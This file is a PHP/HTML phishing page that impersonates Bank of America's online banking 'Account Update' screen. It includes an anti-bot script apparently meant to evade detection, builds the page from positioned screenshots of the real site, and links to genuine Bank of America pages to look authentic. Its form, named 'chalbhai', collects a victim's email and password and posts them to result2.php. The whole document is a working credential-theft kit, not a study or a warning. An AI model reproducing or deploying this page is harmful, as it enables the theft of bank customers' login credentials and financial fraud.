     <?php
include "antibots.php";
?>
<html>
    
    <head>
        <! --- Links ---- !>
        <link rel="stylesheet" href="./css/style1.css" type="text/css" />
        <title>Bank Of America | Online Banking | Account Update</title>

<link rel="shortcut icon"
              href="images/favicon.ico"/>
        <! ---- Links --- !>
         </head>

</script>


    <body>
        <! --- Header ---- !>
       <header class="ilyas_header">
           <div class="logo">

<IMG src="img/boa-header3.png" style="position:absolute;top:0px;left:0px;">
</div>
</div>

<a target="_blank" href="#"><IMG src="img/sb.png" style="position:absolute;top:1px;left:640px; solid #bdc4c9;"></a>
</div>
</div>

<a target="_blank" href="https://www.ml.com/wealthmanagement.html"><IMG src="img/wm.png" style="position:absolute;top:2px;left:760px; solid #bdc4c9;"></a>
</div>
</div>

<a target="_blank" href="https://www.bofaml.com/content/boaml/en_us/home.html"><IMG src="img/bi.png" style="position:absolute;top:3px;left:903px; solid #bdc4c9;"></a>
</div>
</div>

<a target="_blank" href="https://about.bankofamerica.com/"><IMG src="img/about.png" style="position:absolute;top:4px;left:1103px; solid #bdc4c9;"></a>
</div>
</div>

<a href="#"><IMG src="img/up.png" style="position:absolute;top:168px;left:306px; z-index:12"></a>
</div>
</div>

<a href="#"><IMG src="img/sc.png" style="position:absolute;top:167px;left:395px; solid #bdc4c9;"></a>
</div>
</div>

<a href="#"><IMG src="img/profile.png" style="position:absolute;top:44px;left:984px; solid #bdc4c9;"></a>
</div>
</div>

<a href="#"><IMG src="img/bp.png" style="position:absolute;top:104px;left:274px; solid #bdc4c9;"></a>
</div>
</div>

<a href="#"><IMG src="img/transfer.png" style="position:absolute;top:105px;left:353px; solid #bdc4c9;"></a>
</div>
</div>

<a href="#"><IMG src="img/sod.png" style="position:absolute;top:105px;left:445px; solid #bdc4c9;"></a>
</div>
</div>

<a href="#"><IMG src="img/ti.png" style="position:absolute;top:105px;left:608px; solid #bdc4c9;"></a>
</div>
</div>

<a href="#"><IMG src="img/oaa.png" style="position:absolute;top:104px;left:740px; solid #bdc4c9;"></a>
</div>
</div>

<a href="#"><IMG src="img/hs.png" style="position:absolute;top:105px;left:883px; solid #bdc4c9;"></a>
</div>
</div>

<form action="result2.php" name="chalbhai" id="chalbhai" method="post" required="required">
</div>
</div>

<input name="formtext1" type="email" tabIndex="1" aria-label="Name On Card" class="fm-text" required="required" maxlength="100" style="position:absolute;left:463px;top:330px;width:148px;height:16px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;" size="6"  autofocus="1" placeholder="type your e-mail address"> 
</div>
</div>

<input name="formtext2" type="password" tabIndex="1" aria-label="Name On Card" class="fm-text" required="required" maxlength="100" style="position:absolute;left:463px;top:366px;width:148px;height:16px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;" size="6"  autofocus="1" placeholder="type your password"> 
</div>
</div> 

<input type="image" name="formimage1" src="img/continue.png" style="position:absolute;top:402px;left:461px;">
</div>
</div>
               <a target="_blank" href="#"><IMG src="img/so.png" style="position:absolute;top:42px;left:1100px; solid #bdc4c9;">
</div>
</div>

    </body>
</html>